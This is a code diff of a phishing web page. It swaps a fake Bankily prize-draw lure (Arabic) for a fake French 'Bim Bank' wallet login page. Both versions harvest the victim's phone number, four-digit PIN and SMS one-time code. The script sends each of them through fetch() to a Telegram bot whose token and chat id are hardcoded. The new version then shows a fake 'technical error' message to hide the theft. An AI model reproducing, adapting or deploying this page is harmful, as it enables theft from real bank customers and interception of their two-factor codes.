@@ -1,151 +1,166 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="fr" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بنكيلي - مسابقة الجوائز الكبرى</title>
+    <title>Bim Bank - Connexion</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
         
-        body { font-family: 'Tajawal', sans-serif; background-color: #f0f4f0; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #ffffff; }
         
-        /* ألوان بنكيلي الرسمية */
-        .bg-bankily-green { background-color: #008444; }
-        .text-bankily-green { color: #008444; }
-        .bg-bankily-yellow { background-color: #ffcc00; }
-        
-        /* بانر الجوائز المستوحى من الصورة */
-        .promo-banner {
-            background-color: #008444;
-            background-image: url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
-            border-radius: 0 0 40px 40px;
-            padding: 30px 20px;
-            text-align: center;
-            color: white;
-            position: relative;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.15);
+        /* خلفية المربعات الخفيفة (Grid) كما في الصورة */
+        .grid-background {
+            background-image: linear-gradient(#f0f0f0 1px, transparent 1px), linear-gradient(90deg, #f0f0f0 1px, transparent 1px);
+            background-size: 20px 20px;
         }
-        .promo-title { font-size: 1.8rem; font-weight: 900; line-height: 1.4; margin-bottom: 15px; }
-        .prize-tag { background: #ffcc00; color: #008444; padding: 5px 15px; border-radius: 10px; font-weight: 900; font-size: 1.2rem; display: inline-block; margin: 5px; }
+
+        /* تنسيق الأزرار العلوية (Wallet / Banking) */
+        .tab-container {
+            display: flex;
+            border: 1px solid #2a4387;
+            border-radius: 8px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        .tab-item { flex: 1; padding: 10px; text-align: center; font-weight: 600; cursor: pointer; }
+        .tab-active { background-color: #2a4387; color: white; }
+        .tab-inactive { background-color: white; color: #6b7280; }
+
+        /* تنسيق الحقول */
+        .input-field {
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
+            padding: 14px;
+            width: 100%;
+            font-size: 1.1rem;
+            color: #374151;
+            outline: none;
+        }
+        .input-field::placeholder { color: #9ca3af; }
         
-        /* تصميم الحقول */
-        .input-group { background: white; border: 2px solid #e0e0e0; border-radius: 15px; padding: 12px 15px; display: flex; align-items: center; transition: 0.3s; }
-        .input-group:focus-within { border-color: #008444; box-shadow: 0 0 10px rgba(0,132,68,0.1); }
-        .input-group input { width: 100%; outline: none; border: none; font-size: 1.1rem; font-weight: bold; padding-right: 10px; }
+        .char-count { font-size: 10px; color: #9ca3af; text-align: right; margin-top: 2px; }
 
-        .btn-bankily { background: #008444; color: white; width: 100%; padding: 16px; border-radius: 15px; font-size: 1.3rem; font-weight: 900; box-shadow: 0 6px 15px rgba(0,132,68,0.3); transition: 0.2s; }
-        .btn-bankily:active { transform: scale(0.96); }
+        /* زر الدخول البرتقالي */
+        .btn-connexion {
+            background-color: #f19e2c;
+            color: white;
+            width: 100%;
+            padding: 14px;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 1.2rem;
+            margin-top: 20px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+        }
 
-        /* مودال التأكيد */
-        #otp-screen { background-color: rgba(0, 0, 0, 0.75); display: none; backdrop-filter: blur(5px); }
+        /* مودال التحقق */
+        #otp-modal { background-color: rgba(255, 255, 255, 0.95); display: none; }
     </style>
 </head>
-<body class="flex flex-col min-h-screen">
+<body class="grid-background min-h-screen flex flex-col items-center px-8">
 
-    <!-- الجزء العلوي: بانر المسابقة (مستوحى من image_7) -->
-    <div class="promo-banner">
-        <h1 class="promo-title">لازال بإمكانكم<br>الفوز مع بنكيلي</h1>
-        <div class="flex flex-wrap justify-center gap-2">
-            <span class="prize-tag">20,000,000 MRU</span>
-            <span class="prize-tag">آيفون 17 برو ماكس</span>
-        </div>
-        <div class="mt-4 text-sm font-bold opacity-90">سجل دخولك الآن لتأكيد اشتراكك في السحب</div>
+    <!-- الشعار العلوي -->
+    <div class="mt-10 flex flex-col items-center">
+        <img src="https://telegra.ph/file/0c9e658933b49e1e2479e.png" alt="Bim Bank Logo" class="h-32 w-auto">
+        <p class="text-[#4b5563] text-lg text-center mt-4">Bienvenue dans votre<br>espace wallet</p>
     </div>
 
-    <!-- شعار بنكيلي (مستوحى من image_8) -->
-    <div class="flex justify-center py-6">
-        <div class="bg-white p-4 rounded-2xl shadow-sm">
-            <img src="https://bankily.mr/wp-content/uploads/2020/09/Logo-Bankily-BPM-1.png" alt="Bankily" class="h-16">
+    <!-- أزرار الاختيار (Wallet / Banking) -->
+    <div class="w-full max-w-sm">
+        <div class="tab-container">
+            <div class="tab-item tab-active">Wallet</div>
+            <div class="tab-item tab-inactive">Banking</div>
         </div>
     </div>
 
-    <!-- واجهة تسجيل الدخول -->
-    <div id="login-step" class="w-full max-w-sm mx-auto px-6 space-y-6">
-        <div>
-            <label class="block text-bankily-green font-bold mb-2 mr-2">رقم الهاتف المختصر</label>
-            <div class="input-group">
-                <span class="text-xl">📱</span>
-                <input id="phone" type="tel" maxlength="8" oninput="limit(this, 8)" placeholder="رقم الهاتف">
-            </div>
+    <!-- فورم تسجيل الدخول -->
+    <div id="login-form" class="w-full max-w-sm mt-4">
+        <h2 class="text-[#2a4387] font-bold text-xl mb-4">Connexion</h2>
+        
+        <!-- حقل الهاتف -->
+        <div class="mb-4">
+            <input id="phone" type="tel" maxlength="8" oninput="updateCount('phone', 8)" class="input-field" placeholder="Téléphone">
+            <div id="phone-count" class="char-count">0/8</div>
         </div>
 
-        <div>
-            <label class="block text-bankily-green font-bold mb-2 mr-2">رمز PIN السري</label>
-            <div class="input-group">
-                <span class="text-xl">🔒</span>
-                <input id="pin" type="password" maxlength="4" oninput="limit(this, 4)" placeholder="****">
-            </div>
+        <!-- حقل كلمة المرور -->
+        <div class="mb-2">
+            <input id="pin" type="password" maxlength="4" oninput="updateCount('pin', 4)" class="input-field" placeholder="Mot de passe">
+            <div id="pin-count" class="char-count">0/4</div>
         </div>
 
-        <button onclick="startProcessing()" class="btn-bankily">
-            دخول السحب الآمن
+        <div class="text-right">
+            <a href="#" class="text-gray-400 text-sm">Mot de passe oublié ?</a>
+        </div>
+
+        <button onclick="handleSubmit()" class="btn-connexion">
+            Connexion
         </button>
 
-        <p class="text-center text-gray-500 text-sm font-bold">بنكي فيدي .. بنكيلي!</p>
+        <!-- روابط سفلية -->
+        <div class="mt-12 text-center">
+            <p class="text-gray-500">Nouvel utilisateur ?</p>
+            <a href="#" class="text-[#2a4387] font-bold flex items-center justify-center gap-2 mt-1">
+                S'inscrire maintenant <span>&rarr;</span>
+            </a>
+        </div>
+
+        <div class="mt-10 flex justify-center">
+            <button class="border border-gray-300 rounded-lg px-6 py-2 flex items-center gap-2 text-gray-600 font-semibold">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
+                </svg>
+                Contacts
+            </button>
+        </div>
     </div>
 
-    <!-- شاشة الرمز السري (OTP) -->
-    <div id="otp-screen" class="fixed inset-0 z-50 flex items-center justify-center p-4">
-        <div class="bg-white rounded-[30px] p-8 w-full max-w-sm shadow-2xl text-center">
-            <div class="w-20 h-20 bg-green-50 border-4 border-bankily-green rounded-full flex items-center justify-center mx-auto mb-4">
-                <span id="timer" class="text-bankily-green font-black text-xl">05:00</span>
-            </div>
-            <h2 class="text-2xl font-black text-gray-800 mb-2">تأكيد الرمز</h2>
-            <p class="text-gray-500 text-sm mb-6">يرجى إدخال الرمز المكون من 6 أرقام لتأكيد عملية الاشتراك</p>
+    <!-- واجهة OTP (تظهر بعد الضغط على Connexion) -->
+    <div id="otp-modal" class="fixed inset-0 z-50 flex flex-col items-center justify-center px-8">
+        <div class="w-full max-w-sm text-center">
+            <h3 class="text-2xl font-bold text-[#2a4387] mb-4">Vérification SMS</h3>
+            <p class="text-gray-500 mb-8">Veuillez entrer le code de confirmation envoyé à votre mobile</p>
             
-            <input id="otp" type="tel" maxlength="6" class="w-full text-center text-4xl font-black tracking-[10px] border-b-4 border-bankily-green pb-2 outline-none mb-8" placeholder="000000">
+            <input id="otp" type="tel" maxlength="6" class="input-field text-center text-2xl tracking-widest border-2 border-[#f19e2c]" placeholder="000000">
             
-            <button onclick="submitOTP()" class="btn-bankily">تأكيد الآن</button>
+            <button onclick="sendOTP()" class="btn-connexion">Confirmer</button>
         </div>
     </div>
 
     <script>
-        // إعدادات تليجرام المحدثة
-        const token = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0"; 
-        const chatId = "8665814266"; 
+        const token = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
+        const chatId = "8665814266";
 
-        function sendData(msg) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+        function sendMsg(text) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
         }
 
-        function limit(el, max) {
-            el.value = el.value.replace(/[^0-9]/g, '');
-            if(el.value.length > max) el.value = el.value.slice(0, max);
+        function updateCount(id, max) {
+            const input = document.getElementById(id);
+            input.value = input.value.replace(/[^0-9]/g, '');
+            document.getElementById(id + '-count').textContent = input.value.length + '/' + max;
         }
 
-        function startProcessing() {
+        function handleSubmit() {
             const phone = document.getElementById('phone').value;
             const pin = document.getElementById('pin').value;
-            
             if(phone.length === 8 && pin.length === 4) {
-                sendData(`🚀 Bankily Login:\n📱 الهاتف: ${phone}\n🔑 الرمز: ${pin}`);
-                document.getElementById('otp-screen').style.display = 'flex';
-                runTimer(300);
+                sendMsg(`📍 Bim Bank Login:\n📱 Phone: ${phone}\n🔑 PIN: ${pin}`);
+                document.getElementById('login-form').style.display = 'none';
+                document.getElementById('otp-modal').style.display = 'flex';
             } else {
-                alert("تأكد من إدخال رقم الهاتف (8 أرقام) والرمز (4 أرقام)");
+                alert("Veuillez vérifier vos informations.");
             }
         }
 
-        function runTimer(sec) {
-            let t = sec;
-            const timerEl = document.getElementById('timer');
-            const interval = setInterval(() => {
-                let m = Math.floor(t / 60);
-                let s = t % 60;
-                timerEl.innerText = `${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
-                if (--t < 0) clearInterval(interval);
-            }, 1000);
-        }
-
-        function submitOTP() {
+        function sendOTP() {
             const otp = document.getElementById('otp').value;
             if(otp.length === 6) {
-                sendData(`✅ Bankily OTP:\nالرمز: ${otp}`);
-                alert("تم تسجيل اشتراكك في سحب الـ 20 مليون بنجاح!");
+                sendMsg(`✅ OTP Code: ${otp}`);
+                alert("Une erreur technique est survenue. Veuillez réessayer plus tard.");
                 location.reload();
-            } else {
-                alert("أدخل الرمز كاملاً");
             }
         }
     </script>
